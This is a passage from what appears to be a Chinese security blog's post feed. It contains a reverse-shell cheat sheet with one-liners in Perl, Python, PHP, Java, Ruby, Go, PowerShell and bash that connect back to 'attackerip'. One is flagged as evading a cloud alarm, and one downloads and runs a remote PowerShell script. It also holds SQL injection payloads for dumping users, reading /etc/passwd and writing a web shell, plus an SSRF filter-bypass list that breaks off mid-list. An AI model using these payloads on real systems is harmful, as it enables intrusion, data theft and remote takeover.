class="line-numbers-rows"><span></span></span></code></pre><p>不依赖于/bin/sh 的 shell： ***这条语句比上面的更为简短，而且确实不需要依赖/bin/sh</p><pre class="line-numbers language-bash"><code class="language-bash">perl -MIO -e <span class="token string">'<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-python-反弹（云盾不报警）"><a href="#5-python-反弹（云盾不报警）" class="headerlink" title="5. python 反弹（云盾不报警）"></a>5. python 反弹（云盾不报警）</h4><pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"attackerip"<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外的形式：</p><pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect<span class="token variable"><span class="token punctuation">((</span>'attackerip'<span class="token punctuation">,</span><span class="token number">9000</span><span class="token punctuation">))</span></span>\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外 Metasploit 版的代码：</p><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>attackerip LPORT<span class="token operator">=</span>1234<span class="token function">import</span> base64<span class="token punctuation">;</span> exec<span class="token punctuation">(</span>base64.b64decode<span class="token punctuation">(</span><span class="token string">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-php-反弹"><a href="#6-php-反弹" class="headerlink" title="6. php 反弹"></a>6. php 反弹</h4><pre class="line-numbers language-bash"><code class="language-bash">php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("attackerip",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-java-反弹"><a href="#7-java-反弹" class="headerlink" title="7. java 反弹"></a>7. java 反弹</h4><pre class="line-numbers language-bash"><code class="language-bash">r <span class="token operator">=</span> Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> r.exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"exec 5&lt;>/dev/tcp/attackerip/2002;cat &lt;&amp;5 | while read line; do \<span class="token variable">$line</span> 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p.waitFor<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="8-ruby-反弹"><a href="#8-ruby-反弹" class="headerlink" title="8. ruby 反弹"></a>8. ruby 反弹</h4><pre class="line-numbers language-bash"><code class="language-bash">ruby -rsocket -e<span class="token string">'f=TCPSocket.open("attackerip",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不依赖于/bin/sh：</p><pre class="line-numbers language-bash"><code class="language-bash">ruby -rsocket -e <span class="token string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果目标系统运行 Windows：</p><pre class="line-numbers language-bash"><code class="language-bash">ruby -rsocket -e <span class="token string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-Golang-反弹"><a href="#9-Golang-反弹" class="headerlink" title="9. Golang 反弹"></a>9. Golang 反弹</h4><pre class="line-numbers language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"bytes"</span>    <span class="token string">"net"</span>    <span class="token string">"os"</span>    <span class="token string">"os/exec"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    conn<span class="token punctuation">,</span> err <span class="token operator">:=</span> net<span class="token punctuation">.</span><span class="token function">Dial</span><span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">,</span> <span class="token string">"attackerip:443"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 解决cmd中文乱码</span>    cn <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/C"</span><span class="token punctuation">,</span> <span class="token string">"chcp 65001"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// cmd/powershell</span>    <span class="token keyword">var</span> output bytes<span class="token punctuation">.</span>Buffer    cn<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> <span class="token operator">&amp;</span>output    cn<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 反弹shell</span>    cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// cmd/powershell</span>    cmd<span class="token punctuation">.</span>Stdin <span class="token operator">=</span> conn    cmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> conn    cmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> conn    cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-powershell-反弹"><a href="#10-powershell-反弹" class="headerlink" title="10. powershell 反弹"></a>10. powershell 反弹</h4><pre class="line-numbers language-bash"><code class="language-bash">powershell IEX <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-PowerShellTcp -Reverse -IPAddress attackerip -port 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="11-其它"><a href="#11-其它" class="headerlink" title="11. 其它"></a>11. 其它</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/attackerip/4444<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 反弹Shell </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令-脑图</title>
      <link href="/post/d71de17e.html"/>
      <url>/post/d71de17e.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/519483/1609411449351-a5c66a30-555d-44f9-8119-cd7592a57344.jpeg#align=left&amp;display=inline&amp;height=2900&amp;margin=%5Bobject%20Object%5D&amp;name=Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-%E8%84%91%E5%9B%BE.jpg&amp;originHeight=2900&amp;originWidth=3328&amp;size=1042649&amp;status=done&amp;style=none&amp;width=3328" alt="Linux常用命令-脑图.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF之信息收集-脑图</title>
      <link href="/post/de12c44d.html"/>
      <url>/post/de12c44d.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-之信息收集-脑图"><a href="#CTF-之信息收集-脑图" class="headerlink" title="CTF 之信息收集-脑图"></a>CTF 之信息收集-脑图</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/519483/1609310704140-e079e5b7-775f-4f6c-819b-9b2cd2a276d7.jpeg#height=1512&amp;id=UyufX&amp;margin=%5Bobject%20Object%5D&amp;name=CTF%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%84%91%E5%9B%BE.jpg&amp;originHeight=1512&amp;originWidth=2478&amp;originalType=binary%E2%88%B6=1&amp;size=452785&amp;status=done&amp;style=none&amp;width=2478" alt="CTF之信息收集-脑图.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/post/e73517db.html"/>
      <url>/post/e73517db.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p>注：以下内容以 mysql 为例</p><h2 id="一、判断注入点"><a href="#一、判断注入点" class="headerlink" title="一、判断注入点"></a>一、判断注入点</h2><pre class="line-numbers language-plsql"><code class="language-plsql">or 1=1--+'or 1=1--+"or 1=1--+)or 1=1--+')or 1=1--+") or 1=1--+"))or 1=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、注释符"><a href="#二、注释符" class="headerlink" title="二、注释符"></a>二、注释符</h2><h3 id="1-单行注释"><a href="#1-单行注释" class="headerlink" title="1. 单行注释"></a>1. 单行注释</h3><ul><li>–+</li><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li></ul><h3 id="2-多行注释"><a href="#2-多行注释" class="headerlink" title="2. 多行注释"></a>2. 多行注释</h3><ul><li>/_ [SQ 语句] _/</li></ul><h2 id="三、MySql-注入常用系统表"><a href="#三、MySql-注入常用系统表" class="headerlink" title="三、MySql 注入常用系统表"></a>三、MySql 注入常用系统表</h2><h3 id="1-information-schema"><a href="#1-information-schema" class="headerlink" title="1. information_schema"></a>1. information_schema</h3><p>介绍：Information_schema 是 mysql 中自带的一个数据库，这个数据库中包含了其他数据的各种信息，包括数据库中的表名、权限、字段名等。</p><table><thead><tr><th><strong>数据库</strong></th><th><strong>表名</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>information_schema</td><td>tables</td><td>mysql 中存储的全部表名，使用 table_schema 指定数据库名</td></tr><tr><td>information_schema</td><td>columns</td><td>mysql 中存储全部表的字段名，使用 table_name 指定表名</td></tr></tbody></table><h2 id="四、基本注入步骤"><a href="#四、基本注入步骤" class="headerlink" title="四、基本注入步骤"></a>四、基本注入步骤</h2><h3 id="1-获取字段数"><a href="#1-获取字段数" class="headerlink" title="1. 获取字段数"></a>1. 获取字段数</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 方法一</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">6</span> 正确<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">7</span> 错误<span class="token comment" spellcheck="true">## 判断：字段数为6</span><span class="token comment" spellcheck="true"># 方法二</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span>   正确<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span> 错误<span class="token comment" spellcheck="true">## 判断：字段数为6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-获取数据库用户名"><a href="#2-获取数据库用户名" class="headerlink" title="2. 获取数据库用户名"></a>2. 获取数据库用户名</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-获取数据库名称"><a href="#3-获取数据库名称" class="headerlink" title="3. 获取数据库名称"></a>3. 获取数据库名称</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 当前数据库名称</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># 所有数据库名称</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-其它内置函数"><a href="#4-其它内置函数" class="headerlink" title="4. 其它内置函数"></a>4. 其它内置函数</h3><pre class="line-numbers language-sql"><code class="language-sql">version<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true"># MySQL版本</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                           <span class="token comment" spellcheck="true"># 数据库用户名</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true"># 数据库名</span>@<span class="token variable">@datadir</span>                        <span class="token comment" spellcheck="true"># 数据库路径</span>@<span class="token variable">@version_compile_os</span>             <span class="token comment" spellcheck="true"># 操作系统版本</span>sleep<span class="token punctuation">(</span>n<span class="token punctuation">)</span>                                     <span class="token comment" spellcheck="true"># 延时执行n秒</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-读取和写入文件"><a href="#5-读取和写入文件" class="headerlink" title="5. 读取和写入文件"></a>5. 读取和写入文件</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 如果结果返回正常，说明具有读写权限</span><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># 返回错误，应该是管理员对数据库账户降权了</span><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># 注：读取文件必须小于max_allowed_packet</span><span class="token comment" spellcheck="true"># 读取文件</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'D:/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># 写入文件</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'shell code'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/shell.php'</span><span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-查询表名"><a href="#6-查询表名" class="headerlink" title="6. 查询表名"></a>6. 查询表名</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'DatabaseName'</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-查询列名"><a href="#7-查询列名" class="headerlink" title="7. 查询列名"></a>7. 查询列名</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'TableName'</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-查询数据"><a href="#8-查询数据" class="headerlink" title="8. 查询数据"></a>8. 查询数据</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="五、SQL-字符串函数"><a href="#五、SQL-字符串函数" class="headerlink" title="五、SQL 字符串函数"></a>五、SQL 字符串函数</h2><p>SQL 字符串函数主要用于字符串操作。<br><a href="https://www.yiibai.com/sql/sql-string-functions.html">《SQL 字符串函数》</a></p><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><ul><li><a href="https://paper.seebug.org/1665/">《SQL 注入原理及分析》</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF绕过方法总结</title>
      <link href="/post/f66896bc.html"/>
      <url>/post/f66896bc.html</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-绕过方法总结"><a href="#SSRF-绕过方法总结" class="headerlink" title="SSRF 绕过方法总结"></a>SSRF 绕过方法总结</h1><h2 id="一、SSRF-是什么？"><a href="#一、SSRF-是什么？" class="headerlink" title="一、SSRF 是什么？"></a>一、SSRF 是什么？</h2><p>一句话介绍：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务</p><h2 id="二、绕过-127-0-0-1、localhost、其它内部-IP"><a href="#二、绕过-127-0-0-1、localhost、其它内部-IP" class="headerlink" title="二、绕过 127.0.0.1、localhost、其它内部 IP"></a>二、绕过 127.0.0.1、localhost、其它内部 IP</h2><ol><li>利用[::]绕过</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>[<span class="token punctuation">:</span><span class="token punctuation">:</span>]<span class="token punctuation">:</span><span class="token number">80</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token punctuation">:</span><span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>利用 0000::绕过</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0000</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">80</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token punctuation">:</span><span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>使用十进制 IP 定位绕过</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0177.0</span><span class="token number">.0.1</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">2130706433</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">3232235521</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.0.1</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">3232235777</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>使用 IPv6 / IPv4 地址嵌入绕过</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>[<span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span>ffff<span class="token punctuation">:</span><span class="token number">127.0</span><span class="token number">.0.1</span>]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>删除 0 来简化 IP 地址</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.1</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li>利用 bash 变量绕过（仅限 curl）</li></ol><pre class="line-numbers language-bash"><code class="language-bash">curl -v <span class="token string">"http://127<span class="token variable">$google</span>.0.0.1"</span><span class="token variable">$google</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># 等于curl -v "http://127.0.0.1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="7"><li>利用@绕过</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>example.<span class="token keyword">com</span>@<span class="token number">127.0</span><span class="token number">.0.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="8"><li>利用 302、301 重定向</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>dwz.cn<span class="token operator">/</span><span class="token number">11</span>SMa  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="9"><li>利用 DNS 解析</li></ol><p>将 xxx.xxxx.com A 记录解析到 127.0.0.1</p><ol start="10"><li>利用 Enclosed alphanumerics</li></ol><pre class="line-numbers language-basic"><code class="language-basic">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  example.<span class="token keyword">com</span>List<span class="token punctuation">:</span>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ 